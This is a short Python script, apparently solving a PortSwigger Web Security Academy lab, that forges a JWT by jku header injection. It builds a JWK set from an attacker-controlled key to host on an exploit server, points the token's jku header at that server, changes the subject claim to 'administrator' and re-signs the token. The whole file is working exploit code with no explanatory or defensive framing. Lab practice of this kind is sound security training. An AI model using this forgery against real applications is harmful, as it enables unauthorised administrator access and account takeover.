# JWT authentication bypass via jku header injection
from jwcrypto import jwt, jwk
import base64
import json

orig_jwt = "eyJraWQiOiI0ZWE4YzI2MS05OTAxLTQ3NmUtODVlZS1iNjgwOGY4ZjRlMzIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTcwMDAwMH0.VU2B6TMS0MuAyvfKp0t6626VTI_kSoEqOmD9CDdXAaxe_wW4MIU9MkuEKfgr-sFaFfD7I3OP-J9Sg9cS-YJrZ9kRq3CNtzg6WC4GKCHRajLbq6q4A8KPH7pWrIy8C6KazeG_ojlbqrSrTQ6UWqoLdYb1yGRCersFhdmNBFKZvzJ-_9DMsnZg7eSvh-44jWr2PoYCVN0gfcAxZnb5SWDF3fvvcB5MYK3ijwY9koaWJKz1u34z3l39HKWBgNAnCCAqfnEAZymjV-Y5IKtCSb6Vtdou7EHvld0CBg4X-pLndP-ILffPr_L1zTwNwx1CAiS8zVBXRblbCplTvU8z_ajwQg"
h, p, s = orig_jwt.split('.')

h_decode = base64.urlsafe_b64decode(h + '='*(len(h)//4)).decode()
p_decode = base64.urlsafe_b64decode(p + '='*(len(p)//4)).decode()
h_json = json.loads(h_decode)
p_json = json.loads(p_decode)


# Create JKU
with open("Portswigger/Labs_test_with_python/JWT/keypair.pem", "rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())

pub_key = key.export(private_key=False)
pub_key = json.loads(pub_key)
pub_key["kid"] = h_json["kid"]
print('{"keys": [' + json.dumps(pub_key) + ']}')  # -> store at exploit server

p_json["sub"] = "administrator"
h_json["jku"] = "https://exploit-0a0c008804dc47f3c1580d5d01450046.exploit-server.net/exploit"

header = json.dumps(h_json)
payload = json.dumps(p_json)

Token = jwt.JWT(header=header, claims=payload)
Token.make_signed_token(key)
print(Token.serialize())
